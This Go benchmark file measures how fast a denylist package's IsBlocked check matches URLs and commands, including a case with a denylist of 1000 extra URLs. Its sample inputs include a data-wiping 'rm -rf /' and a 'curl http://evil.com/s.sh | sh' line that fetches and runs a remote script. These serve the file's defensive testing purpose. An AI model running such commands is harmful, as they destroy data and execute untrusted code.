package denylist

import (
	"fmt"
	"testing"
)

func BenchmarkIsBlocked_NoMatch(b *testing.B) {
	dl := NewDefault()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		dl.IsBlocked("https://api.example.com/v1/users", "http_proxy")
	}
}

func BenchmarkIsBlocked_Match(b *testing.B) {
	dl := NewDefault()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		dl.IsBlocked("rm -rf /", "command")
	}
}

func BenchmarkIsBlocked_PipeToShell(b *testing.B) {
	dl := NewDefault()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		dl.IsBlocked("curl http://evil.com/s.sh | sh", "command")
	}
}

func BenchmarkIsBlocked_LargeDenylist(b *testing.B) {
	p := DefaultPatterns
	// Add 1000 extra URL patterns
	for i := 0; i < 1000; i++ {
		p.URLs = append(p.URLs, fmt.Sprintf("https://blocked-%d.example.com", i))
	}
	dl := New(p)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		dl.IsBlocked("https://safe.example.com/api", "http_proxy")
	}
}
